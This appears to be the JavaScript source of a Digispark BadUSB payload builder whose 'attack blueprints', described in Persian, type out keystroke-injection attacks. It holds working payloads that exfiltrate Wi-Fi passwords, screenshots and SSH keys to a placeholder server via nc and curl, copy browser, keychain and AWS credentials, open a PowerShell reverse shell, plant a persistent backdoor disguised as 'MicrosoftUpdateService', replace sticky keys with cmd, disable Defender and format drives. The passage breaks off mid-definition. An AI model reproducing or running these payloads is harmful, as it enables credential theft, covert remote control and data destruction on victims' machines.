// Main script.js - orchestrates tabs and initial setup

document.addEventListener('DOMContentLoaded', () => {
    // Initialize first tab (Digispark)
    showTab('digispark');
    addDigisparkAction('keyboard', 'Hello World!', 100); // Add a default Digispark action
    generateDigisparkCode(); // Generate initial code

    // We're making all attacks Digispark-centric, so hide the Android tab.
    const androidTabButton = document.querySelector('.tab-button[onclick="showTab(\'android\')"]');
    if (androidTabButton) {
        androidTabButton.style.display = 'none';
    }

    // Attach global listeners
    document.getElementById('blueprintSelect').addEventListener('change', loadBlueprint);

    // Initial load/save listeners
    const saveBtn = document.querySelector('.save-btn');
    if (saveBtn) saveBtn.addEventListener('click', saveConfig);
    const loadBtn = document.querySelector('.load-btn');
    if (loadBtn) loadBtn.addEventListener('click', loadConfig);
});

// --- Attack Blueprints ---
const attackBlueprints = {
    // --- Data Exfiltration (سرقت اطلاعات) ---
    digi_wifi_password_stealer_windows: {
        description: "این پی‌لود پسوردهای وای‌فای و پروفایل‌های شبکه‌رو از یک سیستم ویندوز استخراج می‌کنه و تلاش می‌کنه اون‌ها رو به یک سرور ریموت بفرسته. **حتماً YOUR_SERVER_IP و YOUR_PORT رو با آدرس سرور C2/لیسنر خودتون جایگزین کنید.** به یک لیسنر netcat یا سرور مشابه نیاز دارید.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Command Prompt as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'cmd', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start cmd /k powershell -windowstyle hidden -command &{Start-Process cmd -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Extract Wi-Fi Passwords and Send to Netcat Listener' },
                    { type: 'keyboard', value: 'netsh wlan export profile folder="C:\\Windows\\Temp" key=clear && type C:\\Windows\\Temp\\*.xml | nc YOUR_SERVER_IP YOUR_PORT', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'keyboard', value: 'del C:\\Windows\\Temp\\*.xml', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_screenshot_exfil_windows: {
        description: "این پی‌لود از صفحه نمایش ویندوز اسکرین‌شات می‌گیره، ذخیره می‌کنه و تلاش می‌کنه اون رو با استفاده از PowerShell و Netcat به یک سرور ریموت بفرسته. **برای این کار به `nc.exe` روی سیستم هدف یا روش دیگری برای خروج داده نیاز دارید. YOUR_SERVER_IP و YOUR_PORT رو جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Take Screenshot and Save' },
                    { type: 'keyboard', value: '$screenshot = [System.Drawing.Image]::FromScreen([System.Drawing.Rectangle]::FromLTRB(0, 0, [System.Windows.Forms.SystemInformation]::VirtualScreen.Width, [System.Windows.Forms.SystemInformation]::VirtualScreen.Height)); $filename = "$env:TEMP\\screenshot.png"; $screenshot.Save($filename);', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Exfiltrate Screenshot via Netcat (Replace YOUR_SERVER_IP, YOUR_PORT)' },
                    { type: 'keyboard', value: 'Get-Content $filename -Encoding Byte | nc.exe YOUR_SERVER_IP YOUR_PORT', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Clean up' },
                    { type: 'keyboard', value: 'Remove-Item $filename', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_data_exfil_usb_windows: {
        description: "این پی‌لود فایل‌های حساس رایج (.docx, .pdf, .txt) رو در پوشه Documents کاربر جستجو می‌کنه و اون‌ها رو به یک درایو USB متصل (با فرض D:) کپی می‌کنه. **اطمینان حاصل کنید که یک درایو USB متصل هست.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Copy sensitive files to D: (CHANGE DRIVE LETTER if needed)' },
                    { type: 'keyboard', value: '$targetDrive = "D:\\"; $sourceDir = "$env:USERPROFILE\\Documents"; Get-ChildItem -Path $sourceDir -Recurse -Include *.docx, *.pdf, *.txt | ForEach-Object { Copy-Item -Path $_.FullName -Destination $targetDrive -Force }', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 3000 },
                    { type: 'comment', value: 'Eject USB Drive (Optional, for stealth)' },
                    { type: 'keyboard', value: 'Write-Host "Please manually eject USB drive.";', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_ssh_key_grab_linux: {
        description: "این پی‌لود تلاش می‌کنه کلیدهای خصوصی SSH رو از دایرکتوری `~/.ssh` کاربر لینوکس بگیره و اون‌ها رو از طریق `curl` (به شرط نصب بودن `curl`) به یک سرور ریموت بفرسته. **YOUR_SERVER_IP و YOUR_PORT رو جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'linux') {
                return [
                    { type: 'comment', value: 'Open Terminal' },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].ctrl, osDigisparkKeyMap[os].alt], key: 'KEY_T' }, delay: 500 },
                    { type: 'delay', value: 1000 },
                    { type: 'comment', value: 'Exfiltrate SSH Keys (Requires curl and listener)' },
                    { type: 'keyboard', value: 'for f in ~/.ssh/id_rsa ~/.ssh/id_dsa ~/.ssh/id_ecdsa ~/.ssh/id_ed25519; do if [ -f "$f" ]; then echo -e "\\n--- FILE: $f ---\\n" && cat "$f" && echo -e "\\n" && curl -X POST -d @$f http://YOUR_SERVER_IP:YOUR_PORT/upload; fi; done', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 3000 },
                    { type: 'comment', value: 'Close Terminal' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Linux only.' }];
        }
    },
    digi_browser_history_grab_windows: {
        description: "این پی‌لود تلاش می‌کنه دیتابیس تاریخچه مرورگرها (کروم/فایرفاکس) رو از پروفایل کاربر ویندوز به پوشه Documents کپی کنه. **این یک مثال پایه هست و ممکنه بر اساس نسخه‌ها/مسیرهای مرورگر نیاز به تنظیم داشته باشه.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Copy Chrome History' },
                    { type: 'keyboard', value: 'Copy-Item "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\History" "$env:USERPROFILE\\Documents\\ChromeHistory.db" -Force -ErrorAction SilentlyContinue', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Copy Firefox History (adjust profile path if needed)' },
                    { type: 'keyboard', value: 'Copy-Item "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default\\places.sqlite" "$env:USERPROFILE\\Documents\\FirefoxHistory.db" -Force -ErrorAction SilentlyContinue', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'You would then need to exfiltrate these files manually or with another blueprint.' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_grab_passwords_mac: {
        description: "این پی‌لود تلاش می‌کنه پسوردهای ذخیره شده در Keychain macOS رو استخراج کنه. **نیاز به لاگین بودن کاربر و احتمالاً باز بودن Keychain Access داره. برای این کار به ابزارهایی مثل `security` نیاز دارید.**",
        type: 'digispark',
        actions: (os) => {
            const cmdKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'mac') {
                return [
                    { type: 'comment', value: 'Open Spotlight' },
                    { type: 'combined_keys', value: { modifiers: [cmdKey], key: 'KEY_SPACE' }, delay: 500 },
                    { type: 'keyboard', value: 'terminal', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Extract Passwords from Keychain (Simple example, might need iteration per login)' },
                    { type: 'keyboard', value: 'security find-internet-passwords -g 2>&1 | tee ~/Desktop/internet_passwords.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'keyboard', value: 'security find-generic-passwords -g 2>&1 | tee -a ~/Desktop/generic_passwords.txt', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Close Terminal' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for macOS only.' }];
        }
    },
    digi_aws_credentials_windows: {
        description: "این پی‌لود تلاش می‌کنه فایل‌های پیکربندی AWS (حاوی اعتبارسنجی) رو از سیستم ویندوز پیدا و به پوشه Documents کاربر کپی کنه. **این فایل‌ها معمولاً در `~/.aws/` قرار دارن.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Copy AWS credentials/config' },
                    { type: 'keyboard', value: 'Copy-Item "$env:USERPROFILE\\.aws\\*" "$env:USERPROFILE\\Documents\\" -Force -ErrorAction SilentlyContinue -Recurse', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'You would then need to exfiltrate these files.' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_chrome_passwords_windows: {
        description: "این پی‌لود به صورت ساده تلاش می‌کنه پسوردهای ذخیره شده در کروم رو پیدا و به یک فایل روی دسکتاپ کپی کنه. **این روش ممکن است به دلیل رمزگذاری یا نیاز به سطح دسترسی بالا، در سیستم‌های جدید کار نکند.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell (Hidden)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -WindowStyle Hidden', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Copy Chrome Login Data DB' },
                    { type: 'keyboard', value: 'Copy-Item "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data" "$env:USERPROFILE\\Desktop\\ChromeLoginData.db" -Force -ErrorAction SilentlyContinue', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'You would then need to exfiltrate this file and decrypt it offline.' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },

    // --- Persistence & Backdoor (پایداری و بک‌دور) ---
    digi_reverse_shell_ps_windows: {
        description: "این پی‌لود یک PowerShell Reverse Shell ایجاد می‌کنه و به لیسنر شما متصل میشه. **YOUR_SERVER_IP و YOUR_PORT رو جایگزین کنید.** اطمینان حاصل کنید که لیسنر شما (مثلاً `nc -lvnp YOUR_PORT`) آماده هست.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start powershell -windowstyle hidden -command &{Start-Process powershell -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'PowerShell Reverse Shell (Listener: nc -lvnp PORT)' },
                    { type: 'keyboard', value: '$client = New-Object System.Net.Sockets.TCPClient("YOUR_SERVER_IP", YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$bytes2 = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($bytes2,0,$bytes2.Length);$stream.Flush()};$client.Close()', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_persistent_backdoor_windows: {
        description: "این پی‌لود یک بک‌دور ساده و دائمی روی ویندوز ایجاد می‌کنه. با اضافه کردن یک اسکریپت PowerShell به پوشه Startup و ایجاد یک وظیفه زمان‌بندی شده. **YOUR_SERVER_IP و YOUR_PORT رو با لیسنر reverse shell خودتون جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start powershell -windowstyle hidden -command &{Start-Process powershell -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Create Persistent Reverse Shell Script' },
                    { type: 'keyboard', value: '$scriptContent = \'$client = New-Object System.Net.Sockets.TCPClient(\"YOUR_SERVER_IP\", YOUR_PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$bytes2 = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($bytes2,0,$bytes2.Length);$stream.Flush()};$client.Close()\'', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 },
                    { type: 'keyboard', value: 'Set-Content -Path "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.ps1" -Value $scriptContent', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Create Scheduled Task for Persistence' },
                    { type: 'keyboard', value: 'schtasks /create /tn "MicrosoftUpdateService" /tr "powershell.exe -windowstyle hidden -file \\"$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\backdoor.ps1\\"" /sc onlogon /rl highest /f', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Close PowerShell' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_add_ssh_key_mac_linux: {
        description: "این پی‌لود یک کلید عمومی SSH رو به فایل `authorized_keys` کاربر اضافه می‌کنه تا امکان دسترسی SSH بدون پسورد رو فراهم کنه. **YOUR_PUBLIC_SSH_KEY رو با کلید عمومی خودتون جایگزین کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            const platformKey = os === 'mac' ? guiKey : (os === 'linux' ? osDigisparkKeyMap[os].ctrl : null);

            if (os === 'mac' || os === 'linux') {
                return [
                    { type: 'comment', value: 'Open Terminal' },
                    { type: 'combined_keys', value: { modifiers: [platformKey], key: (os === 'mac' ? 'KEY_SPACE' : 'KEY_ALT_T') }, delay: 500 },
                    { type: 'keyboard', value: (os === 'mac' ? 'terminal' : 'x-terminal-emulator'), delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Add SSH Public Key to authorized_keys' },
                    { type: 'keyboard', value: 'mkdir -p ~/.ssh && echo "ssh-rsa YOUR_PUBLIC_SSH_KEY_HERE_WITHOUT_QUOTES user@host" >> ~/.ssh/authorized_keys && chmod 600 ~/.ssh/authorized_keys', delay: 100 }, // REPLACE YOUR_PUBLIC_SSH_KEY_HERE
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Close Terminal' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for macOS or Linux only.' }];
        }
    },
    digi_sticky_keys_backdoor_windows: {
        description: "این پی‌لود یک بک‌دور با استفاده از Sticky Keys (کلیدهای چسبنده) در ویندوز ایجاد می‌کنه. با 5 بار فشار دادن Shift، یک Command Prompt با دسترسی ادمین باز می‌شه. **نیاز به UAC bypass یا دسترسی ادمین اولیه دارد.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open CMD as Admin (for UAC bypass if needed)' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start cmd /k powershell -windowstyle hidden -command &{Start-Process cmd -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 }, // Wait for UAC
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Create Sticky Keys Backdoor' },
                    { type: 'keyboard', value: 'copy C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\sethc.exe /Y', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Now, pressing Shift 5 times will open CMD. Restart to test.' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },

    // --- Disruption & Sabotage (اختلال و خرابکاری) ---
    digi_disable_defender_windows: {
        description: "این پی‌لود تلاش می‌کنه نظارت در زمان واقعی ویندوز دیفندر و محافظت‌های مرتبط با اون رو به طور دائم غیرفعال کنه. **این بسیار مخرب هست و فقط باید برای تست‌های مجاز روی سیستم‌های خودتون استفاده بشه.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open PowerShell as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start powershell -windowstyle hidden -command &{Start-Process powershell -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Disable Windows Defender Real-time Monitoring' },
                    { type: 'keyboard', value: 'Set-MpPreference -DisableRealtimeMonitoring $true', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Disable other Defender features (potentially requires reboot)' },
                    { type: 'keyboard', value: 'Set-MpPreference -DisableBehaviorMonitoring $true -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableBlockAtFirstSight $true -MAPSReporting Disabled', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Add exclusion for Temp folder (for future payloads)' },
                    { type: 'keyboard', value: 'Add-MpPreference -ExclusionPath "$env:TEMP"', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Close PowerShell' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_disable_network_mac: {
        description: "این پی‌لود Wi-Fi و Ethernet رو در macOS غیرفعال می‌کنه. این کار می‌تونه برای حمله Denial of Service یا برای آفلاین کردن سیستم استفاده بشه. **برای برخی عملیات‌ها نیاز به دسترسی ادمین یا لاگین بودن کاربر هست.**",
        type: 'digispark',
        actions: (os) => {
            const cmdKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'mac') {
                return [
                    { type: 'comment', value: 'Open Spotlight' },
                    { type: 'combined_keys', value: { modifiers: [cmdKey], key: 'KEY_SPACE' }, delay: 500 },
                    { type: 'keyboard', value: 'terminal', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Disable Wi-Fi' },
                    { type: 'keyboard', value: 'networksetup -setairportpower airport off', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Disable Ethernet (adjust interface name if needed)' },
                    { type: 'keyboard', value: 'networksetup -setnetworkserviceenabled Ethernet off', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'comment', value: 'Close Terminal' },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for macOS only.' }];
        }
    },
    digi_format_drive_windows: {
        description: "این پی‌لود یک درایو مشخص در ویندوز رو فرمت می‌کنه. **فوق‌العاده مخرب! فقط روی سیستم‌های آزمایشی و با مجوز کامل استفاده کنید.**",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            if (os === 'windows') {
                return [
                    { type: 'comment', value: 'Open Command Prompt as Admin' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'cmd', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'powershell -NoP -NonI -Exec Bypass -W Hidden "$ws = New-Object -ComObject Wscript.Shell; $ws.Run(\'cmd.exe /c start cmd /k powershell -windowstyle hidden -command &{Start-Process cmd -Verb RunAs}\', 0, $True);"', delay: 500 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'press_key', value: 'KEY_LEFT_ARROW', delay: 200 },
                    { type: 'press_key', value: enterKey, delay: 2000 },
                    { type: 'comment', value: 'Format Drive (CAUTION: Change D: to target drive!)' },
                    { type: 'keyboard', value: 'format D: /FS:NTFS /Y /V:Destroyed', delay: 100 }, // VERY DANGEROUS! CHANGE D:
                    { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'delay', value: 5000 }, // Wait for format to start
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                ];
            }
            return [{ type: 'comment', value: 'This blueprint is for Windows only.' }];
        }
    },
    digi_shutdown_restart: {
        description: "این پی‌لود سیستم هدف رو خاموش یا ریستارت می‌کنه. می‌تونید انتخاب کنید که فوراً انجام بشه یا با تاخیر.",
        type: 'digispark',
        actions: (os) => {
            const guiKey = osDigisparkKeyMap[os].gui;
            const enterKey = osDigisparkKeyMap[os].enter;
            let actions = [];

            if (os === 'windows') {
                actions.push(
                    { type: 'comment', value: 'Open Run Dialog' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_R' }, delay: 500 },
                    { type: 'keyboard', value: 'shutdown /s /t 0', delay: 100 }, // /s for shutdown, /r for restart, /t 0 for immediate
                    { type: 'press_key', value: enterKey, delay: 500 }
                );
            } else if (os === 'mac') {
                actions.push(
                    { type: 'comment', value: 'Open Spotlight' },
                    { type: 'combined_keys', value: { modifiers: [guiKey], key: 'KEY_SPACE' }, delay: 500 },
                    { type: 'keyboard', value: 'terminal', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 1000 },
                    { type: 'comment', value: 'Shutdown macOS (requires password)' },
                    { type: 'keyboard', value: 'sudo shutdown -h now', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    // { type: 'keyboard', value: 'YOUR_PASSWORD', delay: 500 }, // Uncomment and set password if needed
                    // { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                );
            } else if (os === 'linux') {
                actions.push(
                    { type: 'comment', value: 'Open Terminal' },
                    { type: 'combined_keys', value: { modifiers: [osDigisparkKeyMap[os].ctrl, osDigisparkKeyMap[os].alt], key: 'KEY_T' }, delay: 500 },
                    { type: 'delay', value: 1000 },
                    { type: 'comment', value: 'Shutdown Linux (requires sudo password)' },
                    { type: 'keyboard', value: 'sudo shutdown -h now', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 500 },
                    // { type: 'keyboard', value: 'YOUR_PASSWORD', delay: 500 }, // Uncomment and set password if needed
                    // { type: 'press_key', value: enterKey, delay: 500 },
                    { type: 'keyboard', value: 'exit', delay: 100 },
                    { type: 'press_key', value: enterKey, delay: 100 }
                );
            }
            return actions;
        }
    },
    digi_keyboard_spam: {
        description: "این پی‌لود یک رشته متنی رو به صورت بی‌وقفه روی سیستم هدف تایپ می‌کنه. برای ایجاد مزاحمت یا تست محدودیت‌های ورودی استفاده می‌شه.",
        type: 'digispark',
        actions: (os) => {
            return [
                { type: 'comment', value: 'Spamming keyboard with text' },
                { type: 'keyboard', value: 'YOU ARE HACKED! YOU ARE HACKED! YOU ARE HACKED! ', delay: 50 },
                { type: 'keyboard', value: 'ALL YOUR BASE ARE BELONG TO US! ', delay: 50 },
                { type: 'keyboard', value: 'THIS IS A TEST! ', delay: 50 },
                { type: 'comment', value: 'You might want to make this a looping payload in loop() for continuous spam.' }
            ];
        }
    },
    digi_num_caps_lock_toggle: {
        description: "این پی‌لود به صورت متناوب کلیدهای NumLock و CapsLock رو روشن و خاموش می‌کنه تا کاربر رو اذیت کنه. یک مثال ساده از خرابکاری.",
        type: 'digispark',
